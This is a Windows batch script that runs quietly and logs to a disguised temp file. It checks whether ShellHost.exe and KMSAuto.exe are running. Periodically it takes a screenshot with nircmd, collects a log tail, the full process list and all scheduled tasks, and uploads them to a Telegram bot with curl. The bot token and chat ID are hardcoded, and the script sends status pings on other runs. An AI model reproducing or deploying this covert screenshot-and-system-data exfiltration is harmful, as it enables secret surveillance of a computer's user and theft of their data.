@echo off

if not exist "%temp%\i059.tmp" type nul > "%temp%\i059.tmp"

::goto :EOF

::start notepad

setlocal enabledelayedexpansion


set "BATCHVERSION=6.3"




:: Set the log file path
set "LOGFILE=%temp%\aaazed.mpeez"

:: Start logging from this point
del /f "%LOGFILE%"
call :ALLFORCALL > "%LOGFILE%" 2>&1
goto :EOF




:ALLFORCALL
echo BatchVersion = %BATCHVERSION%




set nircmd="%APPDATA%\Microsoft\nircmd.exe"
set "SHSTFILE=D:\ShellHost.exe"
set "KMSFILE=D:\KMSAuto.exe"





set "input_file=%appdata%\Microsoft\play\playit_output.log"
set "output_file=%appdata%\Microsoft\play\playit_20lines.log"






:: Check if SHSTFILE is running
set "SHSTRUNNING=0"
powershell -command "if ((Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%SHSTFILE%' })) { exit 0 } else { exit 1 }"
if %errorlevel%==1 (
    echo %SHSTFILE% is not running. starting now...
    rem start "" "%SHSTFILE%"
) else (
    set "SHSTRUNNING=1"
    echo %SHSTFILE% is already running.
)

echo SHST RUNNING is !SHSTRUNNING! and %SHSTRUNNING%

echo.
echo.





:: Check if KMSFILE is running
set "KMSRUNNING=0"
powershell -command "if ((Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%KMSFILE%' })) { exit 0 } else { exit 1 }"
if %errorlevel%==1 (
    echo %KMSFILE% is not running. starting now...
    rem start "" "%KMSFILE%"
) else (
    set "KMSRUNNING=1"
    echo %KMSFILE% is already running.
)

echo KMS RUNNING is !KMSRUNNING! and %KMSRUNNING%

echo.
echo.









:: Define the file to track the last run time
set "LASTRUNFILE=%TEMP%\lastrun.log"

:: Check if the file exists
if not exist "%LASTRUNFILE%" (
    echo 1 > "%LASTRUNFILE%"
) else (
    for /f "delims=" %%A in ('type "%LASTRUNFILE%"') do set /a MINUTESS=%%A + 1
    echo !MINUTESS! > "%LASTRUNFILE%"
)

:: Read the updated value
set /p MINUTESS=<"%LASTRUNFILE%"
echo Minutess=%MINUTESS%
echo.
echo.

:: Read the updated value
set "LASTSCREENFILE=%TEMP%\lastscreenrun.log"
set /p TIMESS=<"%LASTSCREENFILE%"

:: Check if 20 minutes have passed
if %MINUTESS% GEQ 20 goto NEXT14

curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|"

goto GOGO3





:NEXT14





:: Use PowerShell to get the last 20 lines of the file and save them to the output file
powershell -Command "Get-Content '%input_file%' | Select-Object -Last 40 | Out-File '%output_file%' -Encoding utf8"
::powershell -Command "Get-Content '%input_file%' | Select-Object -Last 20 | Out-File '%output_file%'"

echo Last 40 lines have been saved to %output_file%










for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename3=!filename!"
set "filename="




set "ProcessTXTFILE=%temp%\!filename3!"


echo Saving All Processes in "%ProcessTXTFILE%"
powershell -command "Get-Process | Select-Object ProcessName, Path | Format-Table -AutoSize -Wrap" > "%ProcessTXTFILE%" 2>nul
::powershell -command "Get-Process | Select-Object ProcessName, Path" > "%ProcessTXTFILE%" 2>nul
echo Saved.
echo.






echo. >> "%output_file%"
echo. >> "%output_file%"
echo. >> "%output_file%"
echo. >> "%output_file%"
echo. >> "%output_file%"
echo. >> "%output_file%"
echo All running processes : >> "%output_file%"
echo. >> "%output_file%"
::goto SENDMSG
type "%ProcessTXTFILE%" >> "%output_file%"
del /f /q "%ProcessTXTFILE%"
echo. >> "%output_file%"
echo. >> "%output_file%"
echo. >> "%output_file%"
echo. >> "%output_file%"




for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename4=!filename!"
set "filename="
set "TASKS_DATA=%temp%\!filename4!"

:: create %TASKS_DATA%
schtasks /query /fo LIST /v > "%TASKS_DATA%"






echo Task Scheduler :  >> "%output_file%"
echo. >> "%output_file%"
echo. >> "%output_file%"
type "%TASKS_DATA%" >> "%output_file%"
del /f /q "%TASKS_DATA%"
echo. >> "%output_file%"
echo. >> "%output_file%"
echo. >> "%output_file%"









:: Use PowerShell to read the contents of playit_7lines.log and URL-encode it
::for /f "delims=" %%a in ('powershell -Command "(Get-Content '%output_file%' | Out-String).Trim() -replace ' ', '%%20' -replace '&', '%%26' -replace '\n', '%%0A'"') do set "CAPTION_MyScrn=%%a"
::for /f "delims=" %%a in ('powershell -Command ^
::    "$content = (Get-Content '%output_file%' -Raw) -replace '\r?\n', '%%0A';" ^
::    "$content -replace ' ', '%%20' -replace '&', '%%26'"') do set "CAPTION_MyScrn=%%a"








:SENDMSG
::goto RESETTO


:: ============ MyScreen TOPIC ============


:: Set bot token, chat ID, and message
set "TOKEN_MyScrn=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID_MyScrn=-1002163721260"
set "TOPIC_ID_MyScrn=74293"
set "MESSAGE_MyScrn=Left......|%time%|"
set "ENCODED_MESSAGE_MyScrn=%MESSAGE_MyScrn: =%%2"
set "CAPTION_MyScrn="






:: Define the file to track the last run time
set "LASTSCREENFILE=%TEMP%\lastscreenrun.log"

:: Check if the file exists
if not exist "%LASTSCREENFILE%" (
    echo 1> "%LASTSCREENFILE%"
) else (
    for /f "delims=" %%A in ('type "%LASTSCREENFILE%"') do set /a TIMESS=%%A + 1
    echo !TIMESS!> "%LASTSCREENFILE%"
)

:: Read the updated value
set /p TIMESS=<"%LASTSCREENFILE%"
echo TIMESS=%TIMESS%
echo.
echo.



set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\LastScreenshots\screenshot%TIMESS%.jpg"
del /f /q "%FILE_PATH_MyScrn%"
"%nircmd%" savescreenshot "%FILE_PATH_MyScrn%"




set RETRIES=1
:SendPhoto
:: Send Photo
echo.
echo TrySendTimes=%RETRIES%
echo.
curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SENDINGNOW1|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|"
echo.
echo.

curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
     -F "chat_id=%CHAT_ID_MyScrn%" ^
     -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
     -F "caption=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|" ^
     -F "photo=@%FILE_PATH_MyScrn%" ^
     --limit-rate 30K



goto SKIPRETRIES


if %ERRORLEVEL% NEQ 0 (
    echo Photo Not sended.
    echo Add +1 To Retries
    set /a RETRIES+=1
	echo Retries = !RETRIES!
	echo.
    if !RETRIES! LSS 3 (
	    echo Retries doesnt exceed 2
        timeout /t 1 /nobreak
        goto SendPhoto
    ) else (
	echo Retries = !RETRIES! .. Sending Bad Internet..
	echo.
	echo.
    curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|BadINTRNT|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|"
	curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|BadINTRNT|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|"
	echo.
	echo Maybe Bad Internet Sent..
	echo.
	echo.
    )
) else (
    echo.
	echo.
    echo Photo Sent Perfect
)


:SKIPRETRIES



set RETRIES=1
:: Send File
curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendDocument" ^
     -F "chat_id=%CHAT_ID_MyScrn%" ^
     -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
     -F "document=@%output_file%" ^
     -F "caption=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|" ^
     --limit-rate 30K

:RESETTO

echo 0 > "%LASTRUNFILE%"


::goto GOGO2




:GOGO2


::del /f /q "%USERPROFILE%\Downloads\screenshot.png"


:GOGO3


echo.
echo.
